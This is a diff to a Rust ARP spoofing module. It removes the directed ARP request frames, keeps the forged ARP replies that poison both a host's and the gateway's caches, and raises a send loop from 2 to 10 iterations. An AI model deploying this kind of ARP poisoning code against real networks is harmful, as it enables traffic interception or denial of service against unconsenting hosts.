@@ -16,7 +16,7 @@ pub fn reset_target_add_count() {
     SPOOFER_TARGET_ADD_COUNT.store(0, Ordering::SeqCst);
 }
 
-use crate::spoofer::raw_l2::{craft_arp_reply, craft_directed_arp_request, RawL2Sender};
+use crate::spoofer::raw_l2::{craft_arp_reply, RawL2Sender};
 use crate::types::{Host, HostStatus, MacAddress};
 
 /// Locally administered unicast blackhole MAC address.
@@ -267,15 +267,6 @@ impl ArpSpoofer {
                         );
                         let _ = s.send_frame(&pkt_host_reply);
 
-                        let pkt_host_req = craft_directed_arp_request(
-                            host.mac,
-                            local_mac,
-                            gateway_ip,
-                            spoof_gw_mac,
-                            host.ip,
-                        );
-                        let _ = s.send_frame(&pkt_host_req);
-
                         // Poison gateway: Host IP is at spoof_host_mac.
                         // Ethernet frame source MAC MUST be local_mac.
                         let pkt_gw_reply = craft_arp_reply(
@@ -287,18 +278,9 @@ impl ArpSpoofer {
                             gateway_mac,
                         );
                         let _ = s.send_frame(&pkt_gw_reply);
-
-                        let pkt_gw_req = craft_directed_arp_request(
-                            gateway_mac,
-                            local_mac,
-                            host.ip,
-                            spoof_host_mac,
-                            gateway_ip,
-                        );
-                        let _ = s.send_frame(&pkt_gw_req);
                     }
                 }
-                for _ in 0..2 {
+                for _ in 0..10 {
                     if !running.load(Ordering::Relaxed) {
                         break;
                     }
